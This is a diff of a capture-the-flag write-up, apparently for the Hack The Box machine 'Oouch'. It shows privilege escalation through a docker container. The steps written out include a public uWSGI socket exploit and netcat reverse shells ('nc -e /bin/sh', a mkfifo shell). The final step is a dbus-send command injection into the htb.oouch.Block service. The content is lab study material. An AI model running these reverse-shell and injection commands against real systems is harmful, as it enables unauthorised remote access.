+The answer was yes! After connecting through ssh with the same key for user `qtc`, I began enumerating the docker container. It took a few tries to find an IP I could connect to \(`172.18.0.5`\).
+
+> _Side note: After going back in to validate my notes, I noticed that the final octet of the container IP seems to be randomized. It was `172.178.0.4` the next time I did it._
 
 ```bash
 qtc@oouch:~/.ssh$ ssh qtc@172.18.0.5 -i id_rsa 
@@ -547,8 +571,10 @@ drwxrwxrwt   1 root root 4096 Jun 11 04:35 tmp
 drwxr-xr-x   1 root root 4096 Jan 30 00:00 usr
 drwxr-xr-x   1 root root 4096 Feb 11 17:36 var
 ```
+
 The `/code` folder looked interesting...
-```
+
+```text
 qtc@aeb4525789d8:/$ cd code
 qtc@aeb4525789d8:/code$ ls -la
 total 52
@@ -583,6 +609,7 @@ simplejson==3.16.0
 mysqlclient==1.4.4
 qtc@aeb4525789d8:/code$ cat config.py
 ```
+
 ```python
 import os
 
@@ -595,7 +622,8 @@ class Config(object):
 
     SECRET_KEY = os.environ.get('SECRET_KEY') or 'klarabubuklarabubuklarabubuklarabubu'
 ```
-The MySQL creds in `config.py` file looked interesting...though I'm not sure if it was another route or a rabbit hole.  I never used it.
+
+The MySQL creds in `config.py` file looked interesting...though I'm not sure if it was another route or a rabbit hole. I never used it.
 
 ```bash
 qtc@aeb4525789d8:/code$ cat uwsgi.ini 
@@ -610,16 +638,20 @@ chmod-sock = 777
 vacuum = true
 die-on-term = true
 ```
-The uwsgi service was running on `oouch`, and the `uwsgi.ini` file is in the docker.  Apparently it runs in the context of the `www-data` user, which we saw earlier in the `htb.oouch.Block.conf`.  I checked to see if there are any exploits and found: [https://github.com/wofeiwo/webcgi-exploits/blob/master/python/uwsgi_exp.py](https://github.com/wofeiwo/webcgi-exploits/blob/master/python/uwsgi_exp.py)
+
+The uwsgi service was running on `oouch`, and the `uwsgi.ini` file is in the docker. Apparently it runs in the context of the `www-data` user, which we saw earlier in the `htb.oouch.Block.conf`. I checked to see if there are any exploits and found: [https://github.com/wofeiwo/webcgi-exploits/blob/master/python/uwsgi\_exp.py](https://github.com/wofeiwo/webcgi-exploits/blob/master/python/uwsgi_exp.py)
 
 I then tried to run the exploit to try to get a reverse shell:
+
 ```bash
 zweilos@kalimaa:~/htb/oouch$ python3 ./uwsgi.py http://10.10.10.177:5000 -c " nc -e /bin/sh 10.0.0.1 1234"
 usage: uwsgi.py [-h] [-m [{http,tcp,unix}]] -u [UWSGI_ADDR] -c [COMMAND]
 uwsgi.py: error: the following arguments are required: -u/--uwsgi
 ```
-The uwsgi service runs from the docker container so I couldn't figure out how to run this exploit remotely. I then copied it to the container (along with nc since it wasn't installed.) 
-> *Note: make sure to put the `:` after the IP and before the folder name, it won't work otherwise.*
+
+The uwsgi service runs from the docker container so I couldn't figure out how to run this exploit remotely. I then copied it to the container \(along with nc since it wasn't installed.\)
+
+> _Note: make sure to put the `:` after the IP and before the folder name, it won't work otherwise._
 
 ```bash
 qtc@oouch:/dev/shm$ scp -i /home/qtc/.ssh/id_rsa ./uwsgi.py qtc@172.18.0.5:/tmp/
@@ -627,7 +659,9 @@ uwsgi.py                                                             100% 4428  
 qtc@oouch:/dev/shm$ scp -i /home/qtc/.ssh/id_rsa /bin/nc qtc@172.18.0.5:/tmp/
 nc                                                                   100%   27KB  24.7MB/s   00:00
 ```
+
 `uwsgi.socket` was in `/tmp` so I had my `--uwsgi` argument taken care of, but then encountered an error while running the exploit:
+
 ```bash
 qtc@aeb4525789d8:/tmp$ python ./uwsgi.py -m unix -u uwsgi.socket -c "nc -e /bin/sh 10.0.0.1 1234"
 [*]Sending payload.
@@ -646,14 +680,18 @@ Traceback (most recent call last):
     if sys.version_info[0] == 3: import bytes
 ModuleNotFoundError: No module named 'bytes'
 ```
-Fortunately commenting out the lines that referenced the `bytes` module solved the problem and the code ran.  I still wasn't able to get a shell back to my box from the docker container, so I tried sending it to the `oouch` box instead.
+
+Fortunately commenting out the lines that referenced the `bytes` module solved the problem and the code ran. I still wasn't able to get a shell back to my box from the docker container, so I tried sending it to the `oouch` box instead.
 
 ...it worked!
+
 ```bash
 qtc@aeb4525789d8:/tmp$ python ./uwsgi.py -m unix -u uwsgi.socket -c "/tmp/nc -e /bin/sh 172.18.0.1 1234"
 [*]Sending payload.
 ```
+
 And, I got a connection back on `qtc@oouch`.
+
 ```bash
 qtc@oouch:/dev/shm$ nc -nvlp 1234
 listening on [any] 1234 ...
@@ -662,9 +700,11 @@ whoami && hostname
 www-data
 aeb4525789d8
 ```
-Now that I was `www-data`, I needed to see if that dbus config I found earlier could come in handy.  It mentioned interacting with dbus and the `htb.oouch.block` app.  The code below was from `routes.py` found in the `/code/oouch` directory of the docker container.  It shows the information needed to craft our message to DBus.  
 
-*I also think this was the filter that was blocking my early XSS attempts on the `/contact` page.* 
+Now that I was `www-data`, I needed to see if that dbus config I found earlier could come in handy. It mentioned interacting with dbus and the `htb.oouch.block` app. The code below was from `routes.py` found in the `/code/oouch` directory of the docker container. It shows the information needed to craft our message to DBus.
+
+_I also think this was the filter that was blocking my early XSS attempts on the `/contact` page._
+
 ```python
 # First apply our primitive xss filter
         if primitive_xss.search(form.textfield.data):
@@ -677,38 +717,47 @@ Now that I was `www-data`, I needed to see if that dbus config I found earlier c
             bus.close()
             return render_template('hacker.html', title='Hacker')
 ```
-I found some examples of how to craft the message at [https://gist.github.com/ukBaz/d7cd0c4b9e7078c89980a3db2bbad98b](https://gist.github.com/ukBaz/d7cd0c4b9e7078c89980a3db2bbad98b).  There is also a related POC that exploits a kernel module (which we didn't need to do for this, thankfully!) at [https://www.exploit-db.com/exploits/36820](https://www.exploit-db.com/exploits/36820).
+
+I found some examples of how to craft the message at [https://gist.github.com/ukBaz/d7cd0c4b9e7078c89980a3db2bbad98b](https://gist.github.com/ukBaz/d7cd0c4b9e7078c89980a3db2bbad98b). There is also a related POC that exploits a kernel module \(which we didn't need to do for this, thankfully!\) at [https://www.exploit-db.com/exploits/36820](https://www.exploit-db.com/exploits/36820).
 
 The example POC code:
-```	bash
+
+```bash
 dbus-send --print-reply --system --dest=com.ubuntu.USBCreator /com/ubuntu/USBCreator com.ubuntu.USBCreator.KVMTest string:/dev/sda dict:string:string:DISPLAY,"foo",XAUTHORITY,"foo",LD_PRELOAD,"/tmp/test.so"
 
 method return sender=:1.4364 -> dest=:1.7427 reply_serial=2
 ```
-My test code: 
+
+My test code:
+
 ```bash
 dbus-send --print-reply --system --dest=htb.oouch.Block /htb/oouch/Block htb.oouch.Block.Block string:"echo whoami;"
 
 method return time=1591881935.932055 sender=:1.2 -> destination=:1.1283 serial=7 reply_serial=2
    string "Carried out :D"
 ```
-The reply `string "Carried out :D"` looks like I am the right track, though I didn't see any echo.  
 
-I then tried substituting the `echo whoami` command for a reverse shell: 
->`dbus-send --print-reply --system --dest=htb.oouch.Block /htb/oouch/Block htb.oouch.Block.Block string:"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.253 1234 >/tmp/f"` 
+The reply `string "Carried out :D"` looks like I am the right track, though I didn't see any echo.
+
+I then tried substituting the `echo whoami` command for a reverse shell:
+
+> `dbus-send --print-reply --system --dest=htb.oouch.Block /htb/oouch/Block htb.oouch.Block.Block string:"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.253 1234 >/tmp/f"`
 
 I still couldn't reach my home box from the container...but maybe I could send this shell to `qtc@oouch` again.
-> *Note: It also needed `;` on the end for some reason!!*
+
+> _Note: It also needed `;` on the end for some reason!!_
 
 ### Getting a shell
 
 My final working exploit:
-```
+
+```text
 dbus-send --print-reply --system --dest=htb.oouch.Block /htb/oouch/Block htb.oouch.Block.Block string:"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f | /bin/sh -i 2>&1 | nc 172.18.0.1 1234 >/tmp/f;"
 
 method return time=1591882762.569865 sender=:1.2 -> destination=:1.1325 serial=15 reply_serial=2
    string "Carried out :D"
 ```
+
 I'm in!
 
 ### Root.txt
